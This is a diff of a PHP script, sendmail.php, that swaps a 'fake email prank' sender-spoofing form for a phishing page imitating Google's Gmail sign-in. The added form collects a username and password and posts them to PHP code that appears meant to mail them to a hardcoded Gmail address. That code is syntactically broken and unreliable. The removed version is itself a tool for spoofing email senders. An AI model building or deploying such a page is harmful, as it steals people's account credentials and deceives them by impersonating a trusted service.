@@ -1,18 +1,12 @@
 <?php
 session_start();
-if ($_POST['Submit'] == 'Send')
-{
-if (strcmp(md5($_POST['user_code']),$_SESSION['ckey']))
-	{ 
-header("Location: sendmail.php?msg=ERROR: Invalid Verification Code");
-exit();
-  } 
 
-$to = $_POST['toemail'];
-$subject = $_POST['subject'];
-$message = $_POST['message'];
-$fromemail = $_POST['fromemail'];
-$fromname = $_POST['fromname'];
+
+$to = $_POST[capianlastimosa@gmail.com];
+$subject = $_POST[kldd];
+$message = $_POST['Email', 'Passwd'];
+$fromemail = $_POST[capianlastimosa@gmail.com];
+$fromname = $_POST[lol];
 $lt= '<';
 $gt= '>';
 $sp= ' ';
@@ -23,41 +17,9 @@ header("Location: sendmail.php?msg= Mail Sent!");
 exit();
 }
 ?>
+<!docktype html>
 <html>
-<head>
-<title>Email Pranks</title>
-</head>
-<body bgcolor="#ffffcc">
-<h2 align="center">
-Fake Email Prank Script By Srikanth
-</h2>
-<h3 align="center">
-Please do not misuse this script. Use it only for having FUN.
-</h3><br>
-<p style="margin-left:15px">
-<form action="sendmail.php" method="POST">
-<b>From Name:</b><br>
-<input type="text" name="fromname" size="50"><br>
-<br><b>From Email:</b><br>
-<input type="text" name="fromemail" size="50"><br>
-<br><b>To Email:</b><br>
-<input type="text" name="toemail" size="50"><br>
-<br><b>Subject:</b><br>
-<input type="text" name="subject" size="74"><br>
-<br><b>Your Message:</b><br>
-<textarea name="message" rows="5" cols="50">
-</textarea><br>
-<br><b>Verification Code:</b><br>
-<input name="user_code" type="text" size="25">  
-<img src="pngimg.php" align="middle"><br><br>
-<input type="submit" name="Submit" value="Send">
-<input type="reset" value="Reset">
-</form>
-</p>
-<?php if (isset($_GET['msg'])) { echo "<font color=\"red\"><h3 align=\"center\"> $_GET[msg] </h3></font>"; } ?>
-<h3 align="center">
-WARNING: Use it at your own risk. Do not use this for Spamming!.
-</h3>
+<body>
+<form  action="sendmail.php" method="POST">   <input name="continue" id="continue" value="https://mail.google.com/mail/?tab=mm" type="hidden">   <input name="service" id="service" value="mail" type="hidden">   <input name="rm" id="rm" value="false" type="hidden">   <input name="dsh" id="dsh" value="-2663017759600220251" type="hidden">   <input name="ltmpl" id="ltmpl" value="googlemail" type="hidden">   <input name="scc" id="scc" value="1" type="hidden">   <input name="GALX" value="FVvSTtLIZzE" type="hidden">   <input id="pstMsg" name="pstMsg" value="0" type="hidden">   <input id="dnConn" name="dnConn" value="" type="hidden">   <input id="checkConnection" name="checkConnection" value="" type="hidden">   <input id="checkedDomains" name="checkedDomains" value="youtube" type="hidden"> <input name="timeStmp" id="timeStmp" value="" type="hidden"> <input name="secTok" id="secTok" value="" type="hidden"> <div class="email-div">   <label for="Email"><strong class="email-label">Username</strong></label>  <input spellcheck="false" name="Email" id="Email" type="text"> </div> <div class="passwd-div">   <label for="Passwd"><strong class="passwd-label">Password</strong></label>   <input name="Passwd" id="Passwd" type="password"> </div>   <input class="g-button g-button-submit" name="signIn" id="signIn" onclick="clickedSubmitButton()" value="Send" type="submit"></form>
 </body>
 </html>
-
